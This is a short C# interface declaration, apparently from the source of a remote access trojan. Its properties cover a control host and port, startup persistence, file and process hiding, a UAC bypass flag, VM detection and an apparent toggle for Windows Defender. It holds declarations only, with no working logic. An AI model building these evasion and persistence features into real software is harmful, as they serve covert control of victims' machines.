namespace Stuff
{
    public interface IClientBridge
    {
        void Send(byte[] data);
        string UID { get; }
        string Version { get; }
        string Mutex { get; }
        int Port { get; }
        string Host { get; }
        bool Startup { get; }
        int Delay { get; }
        bool ProcessCritical { get; }
        bool HideFile { get; }
        bool Box { get; }
        string BoxMsg { get; }
        string BoxIcon { get; }
        bool UAC { get; }
        bool Assist { get; }
        bool OpenWebsite { get; }
        string Website { get; }
        bool VM { get; }
        string Tag { get; }
        string BoxTit { get; }
        bool HidProc { get; }
        bool UACBy { get; }
        string Password { get; }
        string Raw { get; }
        int Reconnect { get; }
        bool Defender { get; }
    }
}
